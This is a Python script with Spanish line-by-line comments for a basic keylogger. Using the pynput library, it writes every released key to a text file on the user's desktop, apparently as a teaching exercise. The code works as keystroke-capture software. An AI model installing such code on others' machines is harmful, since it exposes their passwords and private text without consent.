"""
from pynput.keyboard import Key, Listener: 
Esta línea importa las clases Key y Listener del módulo keyboard de la biblioteca pynput. 
Key se utiliza para representar las teclas del teclado, y Listener se utilizará para escuchar las pulsaciones de teclas.
"""
from pynput.keyboard import Key, Listener

"""
output_file = "/home/nelson/Escritorio/teclas_registradas.txt": Esto establece la variable output_file 
con la ruta del archivo de salida. En este caso, el archivo se guarda en el escritorio del usuario con 
el nombre "teclas_registradas.txt". Asegúrate de que la ruta sea correcta.
"""
# Ruta del archivo de salida en el escritorio
output_file = "/home/nelson/Escritorio/teclas_registradas.txt"


"""
def on_key_release(key): Aquí se define una función llamada on_key_release que toma 
un argumento key. Esta función se ejecutará cada vez que se suelte una tecla.
"""
def on_key_release(key):
    # Cuando se suelta una tecla, se guarda en el archivo

    """
with open(output_file, "a") as f:: Este bloque de código abre el archivo 
output_file en modo de escritura ("a") y lo asocia con el nombre de variable f. 
El modo "a" significa "adjuntar", lo que permite agregar contenido al archivo sin borrar su contenido previo.

try:: Se inicia un bloque try, que se utiliza para manejar excepciones.

f.write(f"{key.char}"): Aquí se intenta escribir el carácter correspondiente a la tecla presionada en el archivo f. Esto funciona si key tiene un atributo char, lo que significa que la tecla es un carácter imprimible (como letras o números).

except AttributeError:: Si la operación de escritura genera un error de atributo, significa que key no tiene un atributo char y, por lo tanto, no es un carácter imprimible.

if key == Key.space:: Si key es igual a Key.space, se escribe un espacio en el archivo. Esto maneja el caso de la tecla de espacio.

elif key == Key.enter:: Si key es igual a Key.enter, se escribe una nueva línea en el archivo. Esto maneja el caso de la tecla "Enter" (retorno de carro).

with Listener(on_release=on_key_release) as listener:: Esto inicia un "escuchador" de pulsaciones de teclas. El escuchador se crea utilizando la función Listener y se configura para llamar a la función on_key_release cada vez que se suelta una tecla.

listener.join(): Este método inicia el escuchador y lo mantiene en ejecución. El programa seguirá registrando las pulsaciones de teclas hasta que se detenga manualmente.

"""
    with open(output_file, "a") as f:
        try:
            f.write(f"{key.char}")
        except AttributeError:
            if key == Key.space:
                f.write(" ")
            elif key == Key.enter:
                f.write("\n")

# Inicia el registro de teclas
with Listener(on_release=on_key_release) as listener:
    listener.join()
